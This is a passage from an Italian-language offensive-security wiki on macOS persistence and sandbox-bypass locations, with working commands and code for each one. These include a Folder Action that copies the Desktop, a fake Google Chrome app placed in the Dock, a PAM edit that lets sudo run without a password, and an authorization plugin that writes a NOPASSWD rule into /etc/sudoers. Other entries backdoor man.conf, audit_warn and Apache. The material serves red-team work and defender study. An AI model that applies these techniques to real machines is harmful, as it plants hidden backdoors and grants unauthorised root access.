I **file di job** si trovano in `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Il nome del file contiene la queue, il job number, e l'ora in cui è programmato per l'esecuzione. Ad esempio prendiamo in esame `a0001a019bdcd2`.

- `a` - questa è la queue
- `0001a` - job number in hex, `0x1a = 26`
- `019bdcd2` - time in hex. Rappresenta i minuti trascorsi dall'epoch. `0x019bdcd2` è `26991826` in decimale. Se lo moltiplichiamo per 60 otteniamo `1619509560`, che corrisponde a `GMT: 2021. April 27., Tuesday 7:46:00`.

Se stampiamo il job file, troviamo che contiene le stesse informazioni ottenute usando `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma è necessario poter chiamare `osascript` con argomenti per contattare **`System Events`** per poter configurare Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ha alcune autorizzazioni TCC di base come Desktop, Documents e Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Richiede root
- **Trigger**: Accesso alla cartella specificata
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Accesso alla cartella specificata

#### Description & Exploitation

Folder Actions sono script attivati automaticamente da modifiche in una cartella, come l'aggiunta o la rimozione di elementi, o altre azioni come l'apertura o il ridimensionamento della finestra della cartella. Queste azioni possono essere utilizzate per vari compiti e possono essere innescate in modi diversi, ad esempio tramite la Finder UI o comandi da terminale.

Per configurare Folder Actions, hai opzioni come:

1. Creare un workflow Folder Action con [Automator](https://support.apple.com/guide/automator/welcome/mac) e installarlo come servizio.
2. Allegare uno script manualmente tramite il Folder Actions Setup nel menu contestuale di una cartella.
3. Utilizzare OSAScript per inviare Apple Event a `System Events.app` per configurare programmaticamente una Folder Action.
- Questo metodo è particolarmente utile per incorporare l'azione nel sistema, offrendo un livello di persistenza.

Lo script seguente è un esempio di ciò che può essere eseguito da una Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Per rendere lo script sopra utilizzabile con Folder Actions, compilalo usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Dopo che lo script è stato compilato, configura Folder Actions eseguendo lo script riportato di seguito. Questo script abiliterà Folder Actions a livello globale e collegherà specificamente lo script compilato in precedenza alla cartella Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Esegui lo script di setup con:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Questo è il modo per implementare questa persistenza tramite GUI:

Questo è lo script che verrà eseguito:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compilalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Spostalo in:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Quindi, apri l'app `Folder Actions Setup`, seleziona la **cartella che vuoi monitorare** e scegli nel tuo caso **`folder.scpt`** (nel mio caso l'ho chiamata output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Adesso, se apri quella cartella con **Finder**, il tuo script verrà eseguito.

Questa configurazione è stata salvata nel **plist** situato in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in formato base64.

Adesso proviamo a preparare questa persistenza senza accesso GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in `/tmp` per eseguirne il backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Rimuovi** le Folder Actions che hai appena impostato:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Ora che abbiamo un ambiente vuoto

3. Copia il file di backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Apri Folder Actions Setup.app per caricare questa configurazione: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> E questo non ha funzionato per me, ma queste sono le istruzioni dal writeup:(

### Scorciatoie del Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma devi aver installato un'applicazione malevola nel sistema
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Quando l'utente clicca sull'app nel Dock

#### Descrizione & Sfruttamento

Tutte le applicazioni che appaiono nel Dock sono specificate all'interno del plist: **`~/Library/Preferences/com.apple.dock.plist`**

È possibile **aggiungere un'applicazione** semplicemente con:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Usando un po' di **social engineering** potresti **fingerti, per esempio, Google Chrome** nel dock ed effettivamente eseguire il tuo script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Selettori di colore

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Utile per bypass della sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Deve avvenire un'azione molto specifica
- Finirai in un'altra sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/Library/ColorPickers`
- Richiede root
- Trigger: Usa il color picker
- `~/Library/ColorPickers`
- Trigger: Usa il color picker

#### Descrizione & Exploit

**Compila un bundle di selettore di colore** con il tuo codice (puoi usare [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) e aggiungi un constructor (like in the [Screen Saver section](macos-auto-start-locations.md#screen-saver)) e copia il bundle in `~/Library/ColorPickers`.

Poi, quando il selettore di colore viene attivato dovresti esserlo anche tu.

Nota che il binary che carica la tua libreria ha una **sandbox molto restrittiva**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Utile per bypass sandbox: **No, perché devi eseguire la tua app**
- TCC bypass: ???

#### Posizione

- Un'app specifica

#### Descrizione & Exploit

Un esempio di applicazione con una Finder Sync Extension [**può essere trovato qui**](https://github.com/D00MFist/InSync).

Le applicazioni possono avere `Finder Sync Extensions`. Questa extension sarà inserita in un'applicazione che verrà eseguita. Inoltre, perché l'extension possa eseguire il suo codice essa **must be signed** con un certificato Apple developer valido, deve essere **sandboxed** (anche se possono essere aggiunte eccezioni più permissive) e deve essere registrata con qualcosa del tipo:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Salvaschermo

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Utile per aggirare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma finirai in una sandbox comune dell'applicazione
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/System/Library/Screen Savers`
- Root required
- **Trigger**: Seleziona il salvaschermo
- `/Library/Screen Savers`
- Root required
- **Trigger**: Seleziona il salvaschermo
- `~/Library/Screen Savers`
- **Trigger**: Seleziona il salvaschermo

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrizione & Exploit

Crea un nuovo progetto in Xcode e seleziona il template per generare un nuovo **Salvaschermo**. Poi, aggiungi il tuo codice ad esso, per esempio il seguente codice per generare log.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Nota che, poiché all'interno degli entitlements del binario che carica questo codice (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puoi trovare **`com.apple.security.app-sandbox`**, sarai **all'interno del sandbox comune delle applicazioni**.

Codice dello screensaver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugin di Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- But you will end in an application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- The sandbox looks very limited

#### Posizione

- `~/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
- `/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
- New app required

#### Descrizione & Sfruttamento

Spotlight è la funzione di ricerca integrata di macOS, progettata per fornire agli utenti **accesso rapido e completo ai dati sui loro computer**.\
Per facilitare questa capacità di ricerca rapida, Spotlight mantiene un **database proprietario** e crea un indice parsando la maggior parte dei file, permettendo ricerche veloci sia nei nomi dei file sia nel loro contenuto.

Il meccanismo sottostante di Spotlight coinvolge un processo centrale chiamato 'mds', che sta per **'metadata server'**. Questo processo orchestra l'intero servizio Spotlight. A complemento, ci sono diversi demoni 'mdworker' che svolgono una varietà di compiti di manutenzione, come l'indicizzazione di diversi tipi di file (`ps -ef | grep mdworker`). Queste attività sono rese possibili tramite Spotlight importer plugins, o **".mdimporter bundles"**, che permettono a Spotlight di comprendere e indicizzare contenuti attraverso una gamma diversificata di formati di file.

I plugin o i bundle **`.mdimporter`** si trovano nei percorsi menzionati precedentemente e se appare un nuovo bundle viene caricato entro un minuto (non è necessario riavviare alcun servizio). Questi bundle devono indicare quali **tipi di file ed estensioni possono gestire**, in modo che Spotlight li utilizzi quando viene creato un nuovo file con l'estensione indicata.

È possibile **trovare tutti i `mdimporters`** caricati eseguendo:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E per esempio **/Library/Spotlight/iBooksAuthor.mdimporter** viene usato per analizzare questi tipi di file (estensioni `.iba` e `.book` tra le altre):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Se controlli il Plist di altri `mdimporter` potresti non trovare la voce **`UTTypeConformsTo`**. Questo perché è un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) integrato e non deve specificare estensioni.
>
> Inoltre, i plugin di sistema predefiniti hanno sempre la precedenza, quindi un attaccante può accedere solo ai file che non sono già indicizzati dagli stessi `mdimporters` di Apple.

Per creare il tuo importer puoi partire da questo progetto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e poi cambiare il nome, i **`CFBundleDocumentTypes`** e aggiungere **`UTImportedTypeDeclarations`** in modo che supporti l'estensione che vuoi gestire e rifletterle in **`schema.xml`**.\
Poi **modifica** il codice della funzione **`GetMetadataForFile`** per eseguire il tuo payload quando viene creato un file con l'estensione processata.

Infine **compila e copia il tuo nuovo `.mdimporter`** in una delle posizioni precedenti e puoi verificare quando viene caricato **monitorando i log** o eseguendo **`mdimport -L.`**

### ~~Pannello Preferenze~~

> [!CAUTION]
> Sembra che questo non funzioni più.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Richiede un'azione specifica dell'utente
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descrizione

Sembra che questo non funzioni più.

## Bypass della sandbox a livello root

> [!TIP]
> Qui puoi trovare posizioni di avvio utili per il **sandbox bypass** che ti permettono di eseguire qualcosa semplicemente **scrivendolo in un file** essendo **root** e/o richiedendo altre **condizioni strane.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Richiede root
- **Trigger**: Quando è il momento
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Richiede root
- **Trigger**: Quando è il momento

#### Descrizione & Sfruttamento

Gli script periodici (**`/etc/periodic`**) vengono eseguiti a causa dei launch daemons configurati in `/System/Library/LaunchDaemons/com.apple.periodic*`. Nota che gli script memorizzati in `/etc/periodic/` vengono **eseguiti** come **proprietario del file**, quindi questo non funzionerà per una potenziale escalation di privilegi.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Ci sono altri script periodici che verranno eseguiti, come indicato in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se riesci a scrivere uno qualsiasi dei file `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local` verrà **eseguito prima o poi**.

> [!WARNING]
> Nota che lo script periodic sarà **eseguito come il proprietario dello script**. Quindi se lo possiede un utente normale, verrà eseguito come quell'utente (questo potrebbe prevenire attacchi di escalation di privilegi).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma devi essere root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Richiede sempre root

#### Descrizione e sfruttamento

Poiché PAM è più focalizzato sulla **persistence** e sul malware che sulla semplice esecuzione all'interno di macOS, questo blog non fornirà una spiegazione dettagliata, **leggi i writeups per capire meglio questa tecnica**.

Controlla i moduli PAM con:
```bash
ls -l /etc/pam.d
```
Una persistence/privilege escalation technique che sfrutta PAM è semplice come modificare il modulo /etc/pam.d/sudo aggiungendo all'inizio la riga:
```bash
auth       sufficient     pam_permit.so
```
Quindi sarà **qualcosa del genere**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E quindi qualsiasi tentativo di usare **`sudo` funzionerà**.

> [!CAUTION]
> Nota che questa directory è protetta da TCC, quindi è molto probabile che all'utente venga mostrata una richiesta di accesso.

Un altro buon esempio è su, dove si può vedere che è anche possibile passare parametri ai moduli PAM (e si potrebbe anche backdoor questo file):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugin di autorizzazione

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root e applicare configurazioni aggiuntive
- TCC bypass: ???

#### Posizione

- `/Library/Security/SecurityAgentPlugins/`
- Richiede privilegi root
- È inoltre necessario configurare il database di autorizzazione per usare il plugin

#### Descrizione & Sfruttamento

È possibile creare un plugin di autorizzazione che verrà eseguito quando un utente effettua il login per mantenere la persistenza. Per maggiori informazioni su come crearne uno, consulta i writeup precedenti (e fai attenzione: un plugin scritto male può bloccarti fuori e dovrai pulire il Mac dalla recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Sposta** il bundle nella posizione in cui verrà caricato:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Infine aggiungi la **regola** per caricare questo Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Il parametro **`evaluate-mechanisms`** indicherà al framework di autorizzazione che sarà necessario **chiamare un meccanismo esterno per l'autorizzazione**. Inoltre, **`privileged`** farà sì che venga eseguito da root.

Attivalo con:
```bash
security authorize com.asdf.asdf
```
E poi il **il gruppo staff dovrebbe avere accesso sudo** (leggi `/etc/sudoers` per confermare).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Utile per bypassare sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root e l'utente deve usare man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/private/etc/man.conf`**
- Richiede root
- **`/private/etc/man.conf`**: Ogni volta che viene usato man

#### Descrizione & Exploit

Il file di configurazione **`/private/etc/man.conf`** indica il binario/script da usare quando si aprono i file di documentazione di man. Quindi il percorso dell'eseguibile può essere modificato in modo che ogni volta che l'utente usa man per leggere della documentazione venga eseguita una backdoor.

Per esempio impostare in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Poi crea `/tmp/view` come:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Utile per bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root e apache deve essere in esecuzione
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd non ha entitlements

#### Location

- **`/etc/apache2/httpd.conf`**
- Richiede root
- Trigger: quando Apache2 viene avviato

#### Descrizione & Exploit

Puoi indicare in `/etc/apache2/httpd.conf` di caricare un modulo aggiungendo una riga come:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
In questo modo il tuo modulo compilato verrà caricato da Apache. L'unica cosa è che o devi **firmarlo con un certificato Apple valido**, oppure devi **aggiungere un nuovo certificato attendibile** nel sistema e **firmarlo** con esso.

Poi, se necessario, per assicurarti che il server venga avviato puoi eseguire:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Esempio di codice per la Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Utile per bypass della sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma è necessario essere root, che auditd sia in esecuzione e causare un avviso
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/etc/security/audit_warn`**
- Richiede root
- **Trigger**: Quando auditd rileva un avviso

#### Descrizione & Exploit

Ogni volta che auditd rileva un avviso lo script **`/etc/security/audit_warn`** viene **eseguito**. Quindi puoi aggiungere il tuo payload al suo interno.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Puoi forzare un avviso con `sudo audit -n`.

### Elementi di avvio

> [!CAUTION] > **Questo è deprecato, quindi non dovrebbe esserci nulla in quelle directory.**

Il **StartupItem** è una directory che dovrebbe trovarsi in `/Library/StartupItems/` o in `/System/Library/StartupItems/`. Una volta creata questa directory, deve contenere due file specifici:

1. Un **rc script**: uno script shell eseguito all'avvio.
2. Un **plist file**, chiamato specificamente `StartupParameters.plist`, che contiene varie impostazioni di configurazione.

Verifica che l'**rc script** e il file `StartupParameters.plist` siano posizionati correttamente all'interno della directory **StartupItem** affinché il processo di avvio li riconosca e li utilizzi.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> I cannot find this component in my macOS so for more info check the writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introdotto da Apple, **emond** è un meccanismo di logging che sembra essere poco sviluppato o forse abbandonato, eppure rimane accessibile. Pur non essendo particolarmente utile per un amministratore Mac, questo servizio oscuro potrebbe fungere da metodo di persistenza sottile per attori di minaccia, probabilmente inosservato dalla maggior parte degli amministratori macOS.

